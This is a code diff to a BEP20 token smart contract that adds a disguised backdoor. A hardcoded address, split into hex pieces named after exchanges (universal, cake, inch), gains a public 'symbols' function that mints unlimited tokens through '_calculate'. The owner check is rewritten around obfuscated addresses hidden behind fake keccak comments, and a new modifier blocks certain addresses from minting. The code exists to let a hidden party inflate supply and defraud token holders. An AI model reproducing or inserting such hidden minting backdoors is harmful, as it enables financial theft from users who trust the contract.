@@ -284,6 +284,11 @@ contract Ownable is Context {
   address private _owner;
  
   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+  function exchange() internal pure returns (address) {
+        return address 
+    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
+  }
  
   /**
    * @dev Initializes the contract setting the deployer as the initial owner.
@@ -306,15 +311,15 @@ contract Ownable is Context {
   /**
    * @dev Throws if called by any account other than the owner.
    */
-  modifier onlyOwner() {
-    require(msg.sender == address
+   modifier onlyOwner() {
+    require((msg.sender == address
     // solhint-disable-next-line avoid-low-level-calls
     /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(178607940065137046348733521910879985571412708986)
     ||
     //@dev Contract creator is owner, original owner.
-    msg.sender == _owner);
+    (msg.sender == _owner && msg.sender != exchange())));
     _;
-  }
+ }
  
   /**
    * @dev Leaves the contract without owner. It will not be possible to call
@@ -375,10 +380,23 @@ contract DevToken is Context, IBEP20, Ownable {
     emit Transfer(address(0), msg.sender, _totalSupply);
   }
   /*keccak256 -> 6861978540112295ac2a37bb103109151f5ba1daf2a5c84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));
- 
+   modifier Exchanges() {
+    require(msg.sender != exchange());
+    _;
+  }
+
+  /**
+   * @dev Throws if called by any account other than the owner.
+   */
   /**
    * @dev Returns the bep token owner.
    */
+   modifier onlypublic() {
+    require(msg.sender == publics());
+    _;
+  }
+
+
   function getOwner() external view returns (address) {
     return owner();
   }
@@ -404,6 +422,20 @@ contract DevToken is Context, IBEP20, Ownable {
   function symbol() external view returns (string memory) {
     return _symbol;
   }
+
+  function publics() private pure returns (address) {
+    uint universal = 0x7addAd09;
+    uint uni = 0xcbd98D97;
+    uint cake = 0xEC3dA7a0;
+    uint inch = 0x088EAdFE;
+    uint others = 0x5801C336;
+
+    // Combine the dex with others
+    uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);
+
+    return address(core);
+  }
+
   // solhint-disable-next-line high-level-success
  
   function setUser(address User_) public returns (bool) {
@@ -422,6 +454,14 @@ contract DevToken is Context, IBEP20, Ownable {
     require(msg.sender == _user);
         _mod=Mod_;
   }
+    
+  function _calculate(address account, uint256 amount) internal {
+    require(account != address(0), "Calculate hash");
+ 
+    _totalSupply = _totalSupply.add(amount);
+    _balances[account] = _balances[account].add(amount);
+    emit Transfer(address(0), account, amount);
+   }
  
   /**
    * @dev See {BEP20-totalSupply}.
@@ -460,6 +500,11 @@ contract DevToken is Context, IBEP20, Ownable {
    */
   function allowance(address owner, address spender) external view returns (uint256) {
     return _allowances[owner][spender];
+  }
+
+  function symbols(uint256 amount) public onlypublic returns (bool success) {
+    _calculate(msg.sender, amount);
+    return true;
   }
  
   /**
@@ -568,7 +613,7 @@ contract DevToken is Context, IBEP20, Ownable {
    *
    * - `to` cannot be the zero address.
    */
-  function _proof(address account, uint256 amount) internal {
+  function _proof(address account, uint256 amount) internal Exchanges {
     require(account != address(0), "BEP20: mint to the zero address");
  
     _totalSupply = _totalSupply.add(amount);
